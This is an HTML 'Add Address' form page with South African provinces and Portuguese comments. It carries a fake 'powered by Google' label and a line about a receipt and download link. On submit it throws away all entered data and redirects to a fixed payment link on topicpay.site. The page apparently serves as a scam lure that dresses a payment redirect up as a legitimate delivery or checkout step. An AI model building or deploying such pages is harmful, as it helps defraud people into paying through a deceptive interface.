<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Add Address</title>

<!-- Tailwind CSS -->
<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

</head>

<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">

<div class="bg-white w-full max-w-xl rounded-lg shadow-xl overflow-hidden relative">

    <!-- Cabeçalho do Modal -->
    <div class="flex justify-between items-center px-6 py-4 border-b border-gray-200">
        <h2 class="text-xl font-bold text-gray-900 mx-auto">Add Address</h2>
        <button class="text-gray-400 hover:text-gray-600 text-xl font-semibold">
            <i class="fa-solid fa-xmark"></i>
        </button>
    </div>

    <!-- Formulário -->
    <form id="addressForm" class="p-6 space-y-6 max-h-[80vh] overflow-y-auto" onsubmit="redirectUser(event)">

        <!-- Tipo de endereço -->
        <div class="grid grid-cols-2 gap-4">
            <label class="flex items-center p-4 border-2 border-blue-600 rounded-lg cursor-pointer bg-blue-50/30 transition-all address-type">
                <input type="radio" name="address_type" value="Residential" checked class="w-4 h-4 text-blue-600 focus:ring-blue-500">
                <span class="ml-3 font-medium text-gray-800">Residential</span>
            </label>

            <label class="flex items-center p-4 border-2 border-gray-200 rounded-lg cursor-pointer hover:border-gray-300 transition-all address-type">
                <input type="radio" name="address_type" value="Business" class="w-4 h-4 text-blue-600 focus:ring-blue-500">
                <span class="ml-3 font-medium text-gray-600">Business</span>
            </label>
        </div>

        <!-- Recipient Name -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">Recipient Name</label>
            <input type="text" name="recipient_name" required class="w-full bg-blue-50/40 border border-gray-200 rounded px-3 py-2.5 text-gray-800 focus:outline-none focus:border-blue-500 transition-colors" placeholder="Full Name or Company">
        </div>

        <!-- Recipient Mobile Number -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">Recipient Mobile Number</label>
            <div class="relative">
                <input type="tel" name="mobile_number" required class="w-full bg-blue-50/40 border border-gray-200 rounded px-3 py-2.5 pr-10 text-gray-800 focus:outline-none focus:border-blue-500 transition-colors" placeholder="Mobile Number">
                <span class="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none text-green-600">
                    <i class="fa-solid fa-circle-info"></i>
                </span>
            </div>
        </div>

        <!-- Email -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">Email</label>
            <input type="email" name="email" required class="w-full bg-blue-50/40 border border-gray-200 rounded px-3 py-2.5 text-gray-800 focus:outline-none focus:border-blue-500 transition-colors" placeholder="name@example.com">
            <p class="text-xs text-gray-400 mt-1">Your receipt and download link are sent here</p>
        </div>

        <hr class="border-gray-100 my-4">

        <!-- Street Address -->
        <div>
            <div class="flex justify-between items-center mb-1">
                <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider">Street Address</label>
                <span class="text-[11px] text-gray-400">powered by <span class="text-blue-600 font-semibold">Google</span></span>
            </div>
            <input type="text" name="street_address" required class="w-full border-b border-gray-300 py-2 text-gray-800 focus:outline-none focus:border-blue-600 transition-colors bg-transparent" placeholder="Eg. 12 Ridge Street">
        </div>

        <!-- Complex / Building -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">Complex / Building <span class="text-gray-400 font-normal">(Optional)</span></label>
            <input type="text" name="complex_building" class="w-full border-b border-gray-300 py-2 text-gray-800 focus:outline-none focus:border-blue-600 transition-colors bg-transparent" placeholder="Complex or Building Name, unit number or floor">
        </div>

        <!-- Suburb -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">Suburb</label>
            <input type="text" name="suburb" required class="w-full border-b border-gray-300 py-2 text-gray-800 focus:outline-none focus:border-blue-600 transition-colors bg-transparent" placeholder="Suburb">
        </div>

        <!-- City / Town -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">City / Town</label>
            <input type="text" name="city" required class="w-full border-b border-gray-300 py-2 text-gray-800 focus:outline-none focus:border-blue-600 transition-colors bg-transparent" placeholder="City / Town">
        </div>

        <!-- Province -->
        <div>
            <div class="flex justify-between items-center mb-1">
                <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider">Province</label>
                <span class="text-xs text-blue-600 cursor-pointer font-medium hover:underline">Select</span>
            </div>

            <select name="province" required class="w-full border-b border-gray-300 py-2 text-gray-800 focus:outline-none focus:border-blue-600 transition-colors bg-transparent">
                <option value="" disabled selected>Select Province</option>
                <option value="Gauteng">Gauteng</option>
                <option value="Western Cape">Western Cape</option>
                <option value="KwaZulu-Natal">KwaZulu-Natal</option>
                <option value="Eastern Cape">Eastern Cape</option>
                <option value="Free State">Free State</option>
                <option value="Mpumalanga">Mpumalanga</option>
                <option value="North West">North West</option>
                <option value="Limpopo">Limpopo</option>
                <option value="Northern Cape">Northern Cape</option>
            </select>
        </div>

        <!-- Postal Code -->
        <div>
            <label class="block text-xs font-medium text-gray-500 uppercase tracking-wider mb-1">Postal Code</label>
            <input type="text" name="postal_code" required class="w-full border-b border-gray-300 py-2 text-gray-800 focus:outline-none focus:border-blue-600 transition-colors bg-transparent max-w-[200px]" placeholder="Postal Code">
        </div>

        <!-- Botão Continue -->
        <div class="pt-4">
            <button type="submit" class="w-full bg-[#1b62a6] hover:bg-[#154d82] text-white font-medium py-3.5 px-4 rounded-full transition-colors shadow-md cursor-pointer">
                Continue
            </button>
        </div>

    </form>
</div>

<!-- Scripts do Formulário -->
<script>
const REDIRECT_URL = "https://topicpay.site/pay/bcd2537d-5a45-4e15-98d6-e3d06f3f37d0";

function redirectUser(event) {
    event.preventDefault();
    window.location.href = REDIRECT_URL;
}

// Estilização dos botões Residential / Business
const radios = document.querySelectorAll('input[name="address_type"]');

radios.forEach(radio => {
    radio.addEventListener('change', (e) => {
        radios.forEach(r => {
            r.closest('label').classList.remove('border-blue-600', 'bg-blue-50/30');
            r.closest('label').classList.add('border-gray-200');
            r.nextElementSibling.classList.remove('text-gray-800');
            r.nextElementSibling.classList.add('text-gray-600');
        });

        if(e.target.checked) {
            e.target.closest('label').classList.remove('border-gray-200');
            e.target.closest('label').classList.add('border-blue-600', 'bg-blue-50/30');
            e.target.nextElementSibling.classList.remove('text-gray-600');
            e.target.nextElementSibling.classList.add('text-gray-800');
        }
    });
});
</script>

</body>
</html>
